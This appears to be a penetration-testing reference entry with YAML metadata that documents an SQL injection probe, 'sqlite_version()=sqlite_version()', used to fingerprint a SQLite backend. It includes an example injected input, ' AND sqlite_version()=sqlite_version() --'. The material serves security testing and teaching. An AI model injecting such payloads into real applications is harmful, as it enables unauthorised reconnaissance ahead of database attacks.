---
type: command
executor: sql
data: sqlite_version()=sqlite_version()
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Database
tags:
  - sql-injection
  - fingerprinting
verified: true
validated: true
---

# sqlite-version-test

## Command

```sql
sqlite_version()=sqlite_version()
```

## Description

Uses SQLite's sqlite_version() to fingerprint the DBMS.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Fixed | N/A |

## Examples

### Basic Usage

`' AND sqlite_version()=sqlite_version() --`

## Expected Output

True if SQLite.

## Related

- [[procedures/DBMS-Fingerprinting-via-SQL-Injection]]
- [[commands/sqlite-last-insert-rowid-equality-test]]
